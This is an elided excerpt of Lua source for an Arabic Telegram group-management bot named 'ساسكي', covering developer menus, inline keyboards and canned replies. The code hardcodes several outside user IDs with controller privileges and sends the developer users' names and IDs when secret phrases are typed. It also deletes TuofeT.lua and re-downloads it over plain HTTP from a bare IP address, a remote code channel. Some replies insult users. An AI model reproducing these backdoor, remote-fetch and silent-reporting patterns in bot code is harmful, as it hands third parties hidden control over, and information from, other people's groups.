...
chsource = Redis:get(Fast..'chsource') or "OOQOG"
devsource = Redis:get(Fast..'devsource') or "ZZZA7"
function var(value)  
...
ControllerAll = false
local ListSudos = {Sudo_Id,1224024534}
...
Status = true
elseif UserId == 5759036023 then
Status = true
elseif UserId == 5766303243 then
Status = true
...
xname =  (Redis:get(Fast.."Name:Bot") or "ساسكي") 
...
if tonumber(senderr) == 1224024534 then
msg.Name_Controller = ' AHMED 🥇 '
msg.The_Controller = 1
elseif tonumber(senderr) == 5759036023 then
msg.Name_Controller = 'MAGD 🥈'
msg.The_Controller = 1
elseif tonumber(senderr) == 5766303243 then
msg.Name_Controller = 'GOOMA 🥉'
msg.The_Controller = 1
...
if msg.sender_id.user_id == tonumber(1224024534) then
send(msg_chat_id,msg_id,"مرحبآ بك عزيزي المبرمج بآرلو نورت الجروب - 🔥","md",true)
end
end
if msg.content.Fastbots == "messageChatJoinByLink" or msg.content.Fastbots == "messageChatAddMembers" then
if msg.sender_id.user_id == tonumber(5759036023) then
send(msg_chat_id,msg_id,"مرحبآ بك عزيزي مجد نورت  المجموعة  - 🔥","md",true)
end
end
if msg.content.Fastbots == "messageChatJoinByLink" or msg.content.Fastbots == "messageChatAddMembers" then
...
if idephoto then
local Bot_Name = (Redis:get(Fast.."Name:Bot") or "ساسكي")
...
os.execute('rm -rf TuofeT.lua')
download('http://45.32.238.150/Mero/TuofeT.lua','TuofeT.lua')
...
local name_amr = bot.getUser(55555555555).first_name.." "..bot.getUser(55555555555).last_name
local name_parlo = bot.getUser(1224024534).first_name.." "..bot.getUser(1224024534).last_name
local caption = "اليك قائمه مطورين سورس ساسكي :"
if tonumber(UserId_Info.id) ~= 1224024534 then
...
data = {
{
{text = name_amr, data = msg.sender_id.user_id..'/DevShow@55555555555'},
},
{
{text = name_parlo, data = msg.sender_id.user_id..'/DevShow@1224024534'},
},
LocalDev
,
{
...
return send(msg.chat_id, msg.id,"الرابط خطأ \nارسل الرابط بالشكل ده كمثال : https://t.me/OOQOG ", 'md', true)
end
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(1224024534) then
...
{
{text = '‹ ٰ💸 ⇣ الاوامر البنكيه ⇣ 💸 › .', url = "https://t.me/OOQOG/323"}
},
}
...
keyboard.inline_keyboard = {
{
{text = '‹ ٰ☬ ⇣ اونلاين⇣ ☬ › .', url = "https://t.me/zzza7"}
},
}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'vegiejrjddh' or text == 'svydjdjdidiy' or text  == 'hddjjddiididg' then
local Get_Chat = bot.getChat(msg_chat_id)
local Info_Chats = bot.getSupergroupFullInfo(msg_chat_id)
local bains = bot.getUser(msg.sender_id.user_id)
if bains.first_name then
...
bot.sendText(1224024534,0,'*\n◉  مرحباً عزيزي المبرمج اونلاين \nشخص ما يحتاج الي مساعده\n⩹━━━━ََِِ • 𝐒𝐎𝐔𝐑𝐂𝐄,━━━━⩺ \n◉  اسمه :- '..klajq..' \n◉  ايديه :-  : '..msg.sender_id.user_id..'\n◉  - معرفة '..basgk..' \n*',"md",false, false, false, false, reply_markup)
end
if text == '[djdjdk]' or text == 'رhfhdjوزا'  then
local Get_Chat = bot.getChat(msg_chat_id)
local Info_Chats = bot.getSupergroupFullInfo(msg_chat_id)
local bains = bot.getUser(msg.sender_id.user_id)
if bains.first_name then
...
if msg.sender_id.user_id == tonumber(1224024534) then
send(msg_chat_id,msg_id,"❍ انت اونلاين مطور السورس يقلبي🌚♥","md",true)
...
elseif msg.sender_id.user_id == tonumber(55555555555) then
send(msg_chat_id,msg_id,"انت [ساسكي صآحبه الليله دي] يقلبي 🥺♥","md",true)
elseif msg.sender_id.user_id == tonumber(55555555555) then
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(1224024534) then
local txx = "\n"
...
keyboard.inline_keyboard = {
{
{text = 'قناة السورس',url="t.me/OOQOG"}
},
}
local msg_id = msg.id/2097152/0.5
...
keyboardd.inline_keyboard = {
{
{text = 'قناة السورس', url = "https://t.me/OOQOG"}
},
}
local msg_id = msg.id/2097152/0.5
...
bot.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@OOQOG")
sleep(1)
...
data = {
{
{text = '𒅒 - ᴅᴇᴠ ᵛ͢ᵎᵖ 𒅒', url = "https://t.me/zzza7"}
},
{
{text = '✦ َ🅢🅐🅢🅚🅔 ࿉ ✦', url = "https://t.me/OOQOG"}
},
...
if text == (Redis:get(Fast.."Name:Bot") or "ساسكي") then
local NamesBot = (Redis:get(Fast.."Name:Bot") or "ساسكي")
local NameBots = {
"قلب "..NamesBot.. "",
"قلبه ودقاته وكل حياته",
"اؤمر يقمري ♥",
"امرك 🌚",
"ميتين  "..NamesBot.." تعبت منك ",
}
...
if Redis:get(Fast.."name bot type : ") == "photo" then
    ...
    if photo.total_count > 0 then
      local NamesBot = (Redis:get(Fast.."Name:Bot") or "ساسكي")
      local BotName = {
      "ح "..NamesBot.." يبن العاميه",
      "حبيبي وروحي ♥",
      "هو يوم زفت شو بدك عيني ؟",
      "معك "..NamesBot.."  لحماية المجموعات",
      "مش شايف اسمي كانك  ؟"
      }
    return bot.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,BotName[math.random(#BotName)], "md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
      ...
      " موجود تحت تصرفك !",
      "اليوم بالذات انا فاصل من الاخير شو بدك ؟",
      "انا "..NamesBot.."  امرني عزيزي 😌",
      "انت اغبى انسان شفتو كانك مو دارس صف اول ؟"
      }
...
if text == 'اونلاين' or text == 'مطور السورس' or text == 'يايتايتي' then  
local UserId_Info = bot.searchPublicChat("ZZZA7")
if UserId_Info.id then
local UserInfo = bot.getUser(UserId_Info.id)
local InfoUser = bot.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
...
keyboardd.inline_keyboard = {
{
{text = '❲ المبرمج اونلاين ❳', url = "https://t.me/zzza7"}
},
{
{text = '✦ 𝙎َِ𝙊َِ𝙐َِ𝙍َِ𝘾َِ𝙀ِ ✦', url = "https://t.me/OOQOG"},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
data = {
{
{text = '𓆩 ˹ [𝙲𝙷] ˼ 𓆪', url = "https://t.me/OOQOG"}
},
}
}
bot.sendPhoto(msg.chat_id, msg.id, 'http://t.me/'..chsource..'', [[
[ٓ ˚₊· ͟͟͞͞➳❥❬ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 [𝙲𝙷] 𝙲𝚁𝙸𝚂𝚃𝙸𝙽 𝚂𝙾𝚄𝚁𝙲𝙴 ❭• °](t.me/OOQOG )
]],"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup)
end
if text == '/start' then
...
local Name_dev = bot.getUser(Sudo_Id).first_name
local UName_dev = bot.getUser(Sudo_Id).username
local CmdStart = '*\n🤖╖ أهلآ بك في بوت '..(Redis:get(Fast.."Name:Bot") or "ساسكي")..
